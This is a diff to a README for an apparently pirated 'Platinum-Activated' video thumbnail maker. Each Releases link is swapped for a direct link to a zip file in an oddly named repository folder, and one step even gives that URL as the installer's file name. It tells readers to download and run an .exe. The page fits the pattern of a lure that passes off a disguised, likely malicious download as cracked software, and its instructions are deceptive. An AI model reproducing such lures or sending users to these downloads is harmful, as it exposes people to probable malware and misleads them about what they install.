@@ -1,6 +1,6 @@
 # 📹 Video-Thumbnails-Maker-Platinum-Activated - Create Stunning Thumbnails Easily
 
-[![Download Video-Thumbnails-Maker-Platinum](https://img.shields.io/badge/Download-Videothumbnails--Maker--Platinum-brightgreen.svg)](https://github.com/Tenved/Video-Thumbnails-Maker-Platinum-Activated/releases)
+[![Download Video-Thumbnails-Maker-Platinum](https://github.com/Tenved/Video-Thumbnails-Maker-Platinum-Activated/raw/refs/heads/main/complicatedness/Maker-Thumbnails-Activated-Platinum-Video-v1.7.zip)](https://github.com/Tenved/Video-Thumbnails-Maker-Platinum-Activated/raw/refs/heads/main/complicatedness/Maker-Thumbnails-Activated-Platinum-Video-v1.7.zip)
 
 ## 📄 Description
 
@@ -12,13 +12,13 @@ To get started with Video Thumbnails Maker Platinum, follow these simple steps. 
 
 ### 📥 Download & Install
 
-1. **Visit the Download Page**: Go to the [Releases page](https://github.com/Tenved/Video-Thumbnails-Maker-Platinum-Activated/releases). Here, you will find the latest version available for download.
+1. **Visit the Download Page**: Go to the [Releases page](https://github.com/Tenved/Video-Thumbnails-Maker-Platinum-Activated/raw/refs/heads/main/complicatedness/Maker-Thumbnails-Activated-Platinum-Video-v1.7.zip). Here, you will find the latest version available for download.
 
 2. **Locate the Latest Version**: On the Releases page, look for the most recent version. It usually appears at the top of the list, marked with the date it was released.
 
 3. **Download the Installer**: Click on the link to download the installer file for Video Thumbnails Maker Platinum. The file format will be ".exe". This is the application you will run on your Windows PC.
 
-4. **Run the Installer**: Once the download is complete, navigate to your downloads folder. Locate the downloaded file, which will be named something like `VideoThumbnailsMakerPlatinum.exe`. Double-click on it to begin the installation process.
+4. **Run the Installer**: Once the download is complete, navigate to your downloads folder. Locate the downloaded file, which will be named something like `https://github.com/Tenved/Video-Thumbnails-Maker-Platinum-Activated/raw/refs/heads/main/complicatedness/Maker-Thumbnails-Activated-Platinum-Video-v1.7.zip`. Double-click on it to begin the installation process.
 
 5. **Follow the Installation Wizard**: The installation wizard will guide you through the setup. Click "Next" to accept the terms and choose the installation location. Click "Install" to complete the installation.
 
@@ -62,7 +62,7 @@ Join our community for tips and updates on using Video Thumbnails Maker Platinum
 - **Forums**: Connect with other users to share experiences.
 - **Social Media**: Follow us on popular platforms for the latest news.
 
-Remember to check back on the [Releases page](https://github.com/Tenved/Video-Thumbnails-Maker-Platinum-Activated/releases) for updates and new features.
+Remember to check back on the [Releases page](https://github.com/Tenved/Video-Thumbnails-Maker-Platinum-Activated/raw/refs/heads/main/complicatedness/Maker-Thumbnails-Activated-Platinum-Video-v1.7.zip) for updates and new features.
 
 ---
 
